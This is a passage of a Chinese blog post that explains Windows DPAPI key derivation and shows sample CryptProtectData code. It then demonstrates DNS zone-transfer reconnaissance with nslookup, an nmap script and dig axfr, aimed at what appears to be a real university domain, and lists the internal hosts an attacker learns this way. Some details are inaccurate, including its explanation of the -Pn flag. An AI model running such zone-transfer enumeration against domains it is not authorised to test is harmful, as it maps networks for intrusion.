<p>为了防止篡改 <code>MasterKey</code> ，它使用 <code>HMAC</code>  进行散列。 <code>DPAPI</code>  再次使用 <code>SHA-1</code>  作为 <code>HMAC</code>  和用户的密码来派生 <code>HMAC</code>  密钥。然后使用来自上面的密码派生加密密钥和 <code>Triple-DES</code>  来加密 <code>MasterKey</code>  和 <code>MasterKey</code>  的 <code>HMAC</code> 。 <code>salt</code>  和迭代计数都是非秘密值，因此与加密的 <code>MasterKey</code>  一起存储，但未加密。这允许 <code>DPAPI</code>  在给定用户密码的情况下轻松解密 <code>MasterKey</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207145441416.png" alt="image-20211207145441416" /></p>
<p>如上图所示，会话密钥的推导使用了 <code>MasterKey</code> ，随机数，和可选的系统登录密码，用户密码推导生成。16 字节的随机数，会以明文的形式存储于加密后的 <code>BLOB</code>  中， <code>MasterKey</code>  是受推导的加密密钥保护。</p>
<h3 id="00x03-dpapi密钥备份恢复"><a class="anchor" href="#00x03-dpapi密钥备份恢复">#</a> 00x03 DPAPI 密钥备份恢复</h3>
<p>恢复密钥是在用户选择从用户的控制面板创建密码重置磁盘（ <code>PRD</code> ）时生成的。首先， <code>DPAPI</code>  生成一个 <code>2048</code>  位 <code>RSA</code>  公钥 / 私钥对，它是恢复密钥。然后使用公钥将当前密码加密并存储在用户的配置文件中，同时将私钥存储到 <code>PRD</code> ， <code>PRD</code>  实际上可以是任何可移动媒体，然后从内存中移除。私钥只存储在 <code>PRD</code>  中，而其他任何地方都不存在，所以用户将 <code>PRD</code>  保存在安全的地方非常重要。</p>
<p>如果用户输入错误的密码， <code>Windows</code>  会询问他们是否想要使用 PRD 并重置密码。如果他们选择，运行向导会提示输入新密码，并使用 PRD 上的私钥解密旧密码并进行更改。</p>
<h3 id="00x04-dpapi接口调用"><a class="anchor" href="#00x04-dpapi接口调用">#</a> 00x04 DPAPI 接口调用</h3>
<ul>
<li>对数据进行加密：</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">DATA_BLOB</span> DataIn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token constant">DATA_BLOB</span> DataOut<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token constant">DATA_BLOB</span> BlobKey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    DataIn<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>cbDataIn<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 明文数据</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    DataIn<span class="token punctuation">.</span>cbData <span class="token operator">=</span> nLen<span class="token punctuation">;</span> <span class="token comment">// 明文数据长度</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    BlobKey<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 可选用户密码</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    BlobKey<span class="token punctuation">.</span>cbData <span class="token operator">=</span> lenKey<span class="token punctuation">;</span> <span class="token comment">// 可选用户密码长度</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    promp<span class="token punctuation">.</span>szPrompt <span class="token operator">=</span> <span class="token constant">L</span><span class="token string">"测试加密"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    promp<span class="token punctuation">.</span>dwPromptFlags <span class="token operator">=</span> <span class="token constant">CRYPTPROTECT_PROMPT_ON_PROTECT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    promp<span class="token punctuation">.</span>hwndApp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CryptProtectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DataIn<span class="token punctuation">,</span> <span class="token constant">L</span><span class="token string">"敏感数据"</span><span class="token punctuation">,</span> key <span class="token operator">?</span> <span class="token operator">&amp;</span>BlobKey<span class="token operator">:</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>promp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>DataOut<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token operator">*</span>encLen <span class="token operator">=</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">;</span>      <span class="token comment">// 返回密文数据长度</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token operator">*</span>encData <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>encData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 加密后数据</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token function">LocalFree</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>对数据进行解密：</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">DATA_BLOB</span> DataIn<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token constant">DATA_BLOB</span> DataOut<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token constant">DATA_BLOB</span> BlobKey<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token constant">LPWSTR</span> pDescrOut <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    BlobKey<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token function">const_cast</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 可选用户密码</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    BlobKey<span class="token punctuation">.</span>cbData <span class="token operator">=</span> lenKey<span class="token punctuation">;</span> <span class="token comment">// 可选用户密码长度</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    DataIn<span class="token punctuation">.</span>pbData <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token constant">BYTE</span> <span class="token operator">*</span><span class="token punctuation">)</span>const_cast<span class="token operator">&lt;</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">></span><span class="token punctuation">(</span>encData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 待解密数据</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    DataIn<span class="token punctuation">.</span>cbData <span class="token operator">=</span> encLen<span class="token punctuation">;</span> <span class="token comment">// 待解密数据长度</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span> promp<span class="token punctuation">;</span> <span class="token comment">// 是否与用户交互输入可选的用户密码</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    promp<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token constant">CRYPTPROTECT_PROMPTSTRUCT</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    promp<span class="token punctuation">.</span>szPrompt <span class="token operator">=</span> <span class="token constant">L</span><span class="token string">"测试解密"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    promp<span class="token punctuation">.</span>dwPromptFlags <span class="token operator">=</span> <span class="token constant">CRYPTPROTECT_PROMPT_ON_UNPROTECT</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    promp<span class="token punctuation">.</span>hwndApp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    </pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">CryptUnprotectData</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DataIn<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pDescrOut<span class="token punctuation">,</span> key <span class="token operator">?</span> <span class="token operator">&amp;</span>BlobKey<span class="token operator">:</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>promp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>DataOut<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    </pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token operator">*</span>nLen <span class="token operator">=</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token operator">*</span>cbDataIn <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">*</span>cbDataIn<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">,</span> DataOut<span class="token punctuation">.</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 解密后的数据明文</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token function">LocalFree</span><span class="token punctuation">(</span>DataOut<span class="token punctuation">.</span>pbData<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><ul>
<li>
<p>交互弹框提示</p>
</li>
<li>
<p>加密前提示设置加密等级</p>
</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207150741684.png" alt="image-20211207150741684" /></p>
<ul>
<li>加密等级分类</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207150811233.png" alt="image-20211207150811233" /></p>
<ul>
<li>加密等级设置为高时输入用户密码</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207150833389.png" alt="image-20211207150833389" /></p>
<ul>
<li>解密时要求输入用户密码</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207150853666.png" alt="image-20211207150853666" /></p>
<ul>
<li>输入错误的用户密码提示</li>
</ul>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207150911129.png" alt="image-20211207150911129" /></p>
<h3 id="00x05-memory加密及优缺点"><a class="anchor" href="#00x05-memory加密及优缺点">#</a> 00x05 Memory 加密及优缺点</h3>
<p><code>Memory</code>  加解密微软也提供了两个接口， <code>CryptProtectMemory</code>  内存加密， <code>CryptUnprotectMemory</code>  内存解密。一般用于即时加解密用户敏感的数据，如用户密码等。内存加解密用于防止他人在您的进程查看敏感信息，如黑客远程 <code>dump</code>  你的进程内存，分析和破解你的敏感数据。</p>
<p>通常，您使用 <code>CryptProtectMemory</code>  函数来加密您的进程正在运行时将要解密的敏感信息。请勿使用此功能保存稍后要解密的数据；如果计算机重新启动，您将无法解密数据。要将加密数据保存到文件以便稍后解密，请使用 <code>CryptProtectData</code>  函数。</p>
<p>加解密提供了三种标志：</p>
<table>
<thead>
<tr>
<th>Flag</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>CRYPTPROTECTMEMORY_SAME_PROCESS</td>
<td>只能在当前进程内加解密，进程重新运行会无法解密</td>
</tr>
<tr>
<td>CRYPTPROTECTMEMORY_CROSS_PROCESS</td>
<td>可以跨进行加解密，系统重启后失效</td>
</tr>
<tr>
<td>CRYPTPROTECTMEMORY_SAME_LOGON</td>
<td>使用相同的登录凭据来加密和解密不同进程中的内存，系统重启后失效</td>
</tr>
</tbody>
</table>
<p>如果需要持存储密文数据，可选用 <code>DPAPI</code>  的接口。如果临时缓存下敏感数据，可选用对 <code>Memory</code>  加解密的接口。</p>
<p>还有一个致命的缺陷：最低系统版本要求 <code>vista</code>  及以上系统版本，所以 <code>win xp</code>  不支持该接口。</p>
<h3 id="00x06-扩展dpapi加密等级"><a class="anchor" href="#00x06-扩展dpapi加密等级">#</a> 00x06 扩展 DPAPI 加密等级</h3>
<ul>
<li>程序内置用户密码</li>
<li>程序使用物理硬件信息作为用户密码</li>
<li>结合 PKI 技术实现加密用户密码</li>
<li>或者以上的组合</li>
</ul>
<h3 id="00x07-附录"><a class="anchor" href="#00x07-附录">#</a> 00x07 附录</h3>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvZHBhcGlfZGF0YV9kZWNyeXB0b3IuaHRtbA==">DPAPI 在线加解密网站</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczk5NTM1NS5hc3B4">微软参考资料</span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL211eHEvRFBBUEk=">github 代码</span></li>
</ul>
<h2 id="dns域传送漏洞利用"><a class="anchor" href="#dns域传送漏洞利用">#</a> Dns 域传送漏洞利用</h2>
<h3 id="dns分类"><a class="anchor" href="#dns分类">#</a> DNS 分类</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">A</span>记录 <span class="token constant">IP</span>地址记录<span class="token punctuation">,</span>记录一个域名对应的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AAAA</span>记录  IPv6地址记录，记录一个域名对应的IPv6地址</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">CNAME</span>记录   别名记录，记录一个主机的别名</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">MX</span>记录    电子邮件交换记录，记录一个邮件域名对应的<span class="token constant">IP</span>地址，比如my<span class="token punctuation">[</span>at<span class="token punctuation">]</span>lijiejie<span class="token punctuation">.</span>com</pre></td></tr><tr><td data-num="5"></td><td><pre>后面的部分lijiejie<span class="token punctuation">.</span>com，邮件服务器对应的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token constant">NS</span>记录      域名服务器记录 <span class="token punctuation">,</span>记录该域名由哪台域名服务器解析</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">PTR</span>记录     反向记录，也即从<span class="token constant">IP</span>地址到域名的一条记录</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token constant">TXT</span>记录     记录域名的相关文本信息</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">SOA</span>记录   start <span class="token keyword">of</span> anthorization 开始授权，是一种比较难以理解的记录值，一般二级域名才会有</pre></td></tr></table></figure><h3 id="dns域传送"><a class="anchor" href="#dns域传送">#</a> DNS 域传送</h3>
<p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。 <code>DNS</code>  服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用 “ <code>DNS</code>  域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。</p>
<p>若 <code>DNS</code>  服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。</p>
<p>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 <code>Private DNS</code> 。如果内部 <code>DNS</code>  泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。</p>
<h4 id="dns域传送漏洞检测"><a class="anchor" href="#dns域传送漏洞检测">#</a> DNS 域传送漏洞检测</h4>
<p>常用的三种检测方法:  <code>nslookup</code>  命令， <code>nmap</code>  命令， <code>dig</code>  命令，下面将分别演示如何用三种方法检测 <code>dns</code>  域传送漏洞</p>
<p>利用 <code>nslookup</code>  命令发现 <code>DNS</code>  域传送命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\Users\21r000<span class="token operator">></span>nslookup</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">默认服务器</span><span class="token operator">:</span>  UnKnown</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">Address</span><span class="token operator">:</span>  <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.12</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token operator">></span> server 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token literal-property property">默认服务器</span><span class="token operator">:</span>  21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">Address</span><span class="token operator">:</span>  <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.12</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207152604456.png" alt="image-20211207152604456" /></p>
<p>若是不存在漏洞的主机，则可能提示错误 <code>Query Refused</code> :</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">></span> ls 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">[</span>21r000<span class="token punctuation">.</span>org<span class="token punctuation">]</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207152653580.png" alt="image-20211207152653580" /></p>
<p>如存在漏洞的 <code>DNS</code>  服务器则会显示，如下</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207152743087.png" alt="image-20211207152743087" /></p>
<p>操作基本的步骤是:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>输入nslookup命令进入交互式shell</pre></td></tr><tr><td data-num="2"></td><td><pre>Server 命令参数设定查询将要使用的<span class="token constant">DNS</span>服务器</pre></td></tr><tr><td data-num="3"></td><td><pre>Ls命令列出某个域中的所有域名</pre></td></tr></table></figure><p>攻击者能获取的敏感主要包括：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>）网络的拓扑结构，服务器集中的<span class="token constant">IP</span>地址段</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">2</span>）数据库服务器的<span class="token constant">IP</span>地址</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">3</span>）测试服务器的<span class="token constant">IP</span>地址，</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">4</span>）<span class="token constant">VPN</span>服务器地址泄露</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">5</span>）其他敏感服务器</pre></td></tr></table></figure><h4 id="使用nmap扫描dns域传送泄露漏洞"><a class="anchor" href="#使用nmap扫描dns域传送泄露漏洞">#</a> 使用 <code>nmap</code>  扫描 <code>DNS</code>  域传送泄露漏洞</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">--</span>script dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer <span class="token operator">--</span>script<span class="token operator">-</span>args dns<span class="token operator">-</span>zone<span class="token operator">-</span>transfer<span class="token punctuation">.</span>domain<span class="token operator">=</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn <span class="token operator">-</span>p <span class="token number">53</span> <span class="token operator">-</span>Pn dns1<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207153238195.png" alt="image-20211207153238195" /></p>
<p>对上述命令命令说明如下：</p>
<p><code>nmap –script dns-zone-transfer</code>  表示加载 <code>nmap</code>  文件夹下的脚本文件 <code>dns-zone-transfer.nse</code> ，扩展名 <code>.nse</code>  可省略</p>
<p><code>–script-args dns-zone-transfer.domain=zonetransfer.me</code>  向脚本传递参数，设置列出记录的域是 <code>nwpu.edu.cn</code></p>
<p><code>-p 53</code>  设置扫描 <code>53</code>  端口</p>
<p><code>-Pn</code> : 设置通过 <code>Ping</code>  发现主机是否存活</p>
<h4 id="利用dig-检测dns域传送漏洞"><a class="anchor" href="#利用dig-检测dns域传送漏洞">#</a> 利用 <code>dig</code>  检测 <code>dns</code>  域传送漏洞</h4>
<p>这里涉及 <code>dig</code>  一个重要的命令 <code>axfr</code> :</p>
<p><code>axfr</code>  是 <code>q-type</code>  类型的一种:  <code>axfr</code>  类型是 <code>Authoritative Transfer</code>  的缩写，指请求传送某个区域的全部记录。</p>
<p>我们只要欺骗 <code>dns</code>  服务器发送一个 <code>axfr</code>  请求过去，　如果该 <code>dns</code>  服务器上存在该漏洞，就会返回所有的解析记录值</p>
<p>第一步：找到解析域名的 <code>dns</code>  服务器 ( <code>Server</code>  服务器), 我们可以发送一个 <code>ns</code>  类型解析请求过去</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# dig thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn ns              </pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> DiG <span class="token number">9.16</span><span class="token number">.15</span><span class="token operator">-</span>Debian <span class="token operator">&lt;&lt;</span><span class="token operator">>></span> thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn ns</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> global options<span class="token operator">:</span> <span class="token operator">+</span>cmd</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> Got answer<span class="token operator">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token operator">-</span><span class="token operator">>></span><span class="token constant">HEADER</span><span class="token operator">&lt;&lt;</span><span class="token operator">-</span> opcode<span class="token operator">:</span> <span class="token constant">QUERY</span><span class="token punctuation">,</span> <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token constant">NOERROR</span><span class="token punctuation">,</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">30258</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> flags<span class="token operator">:</span> qr rd ra<span class="token punctuation">;</span> <span class="token constant">QUERY</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">ANSWER</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">AUTHORITY</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">ADDITIONAL</span><span class="token operator">:</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">OPT</span> <span class="token constant">PSEUDOSECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">;</span> <span class="token constant">EDNS</span><span class="token operator">:</span> version<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">flags</span><span class="token operator">:</span><span class="token punctuation">;</span> <span class="token constant">MBZ</span><span class="token operator">:</span> <span class="token number">0x0005</span><span class="token punctuation">,</span> <span class="token literal-property property">udp</span><span class="token operator">:</span> <span class="token number">4000</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">QUESTION</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">;</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>                   <span class="token constant">IN</span>      <span class="token constant">NS</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">ANSWER</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>            <span class="token number">5</span>       <span class="token constant">IN</span>      <span class="token constant">NS</span>      dns2<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">;</span><span class="token punctuation">;</span> <span class="token constant">ADDITIONAL</span> <span class="token constant">SECTION</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>dns2<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn<span class="token punctuation">.</span>       <span class="token number">5</span>       <span class="token constant">IN</span>      <span class="token constant">A</span>       <span class="token number">222.160</span><span class="token number">.127</span><span class="token number">.38</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207153332953.png" alt="image-20211207153332953" /></p>
<p>第二步：然后向该域名发送 <code>axfr</code>  请求：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">┌──</span><span class="token punctuation">(</span>root💀kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">/</span>桌面<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="2"></td><td><pre>└─# dig axfr @dns1<span class="token punctuation">.</span>thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn thnu<span class="token punctuation">.</span>edu<span class="token punctuation">.</span>cn</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207153510931.png" alt="image-20211207153510931" /></p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>唔，该复习了，孩子要挂科了呜呜呜！</p>
